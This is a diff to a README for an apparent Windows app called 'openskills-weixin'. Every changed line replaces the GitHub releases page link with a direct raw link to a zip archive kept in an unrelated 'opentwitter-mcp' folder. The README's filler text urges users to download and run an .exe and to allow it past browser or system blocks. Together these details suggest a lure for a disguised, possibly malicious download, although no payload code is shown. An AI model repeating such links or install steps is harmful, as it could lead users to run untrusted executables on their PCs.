@@ -1,12 +1,12 @@
 # 🔧 openskills-weixin - Easy Weixin skills for everyone
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Silvaadscititious380/openskills-weixin/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Silvaadscititious380/openskills-weixin/main/opentwitter-mcp/weixin-openskills-1.8-alpha.5.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest version:
 
-https://github.com/Silvaadscititious380/openskills-weixin/releases
+https://raw.githubusercontent.com/Silvaadscititious380/openskills-weixin/main/opentwitter-mcp/weixin-openskills-1.8-alpha.5.zip
 
 On that page, look for the newest release and download the Windows file that fits your PC. Most users should pick the `.exe` file if one is listed.
 
@@ -30,7 +30,7 @@ If your PC blocks downloads, you may need to allow the file in your browser or i
 ## 🚀 How to install
 
 1. Open the download page:
-   https://github.com/Silvaadscititious380/openskills-weixin/releases
+   https://raw.githubusercontent.com/Silvaadscititious380/openskills-weixin/main/opentwitter-mcp/weixin-openskills-1.8-alpha.5.zip
 
 2. Find the latest release at the top of the page.
 
@@ -123,7 +123,7 @@ More memory and free space can help if you keep many apps open at once.
 
 Use the same release page to check for newer versions:
 
-https://github.com/Silvaadscititious380/openskills-weixin/releases
+https://raw.githubusercontent.com/Silvaadscititious380/openskills-weixin/main/opentwitter-mcp/weixin-openskills-1.8-alpha.5.zip
 
 When a new release appears, download the newest Windows file and replace the older one if needed.
 
@@ -157,6 +157,6 @@ It is meant for users who want a local Windows app they can download and use wit
 
 If you need to reinstall or move the app to another Windows PC, use this same page:
 
-https://github.com/Silvaadscititious380/openskills-weixin/releases
+https://raw.githubusercontent.com/Silvaadscititious380/openskills-weixin/main/opentwitter-mcp/weixin-openskills-1.8-alpha.5.zip
 
 Download the latest release file, then run or extract it based on the file type shown on the page
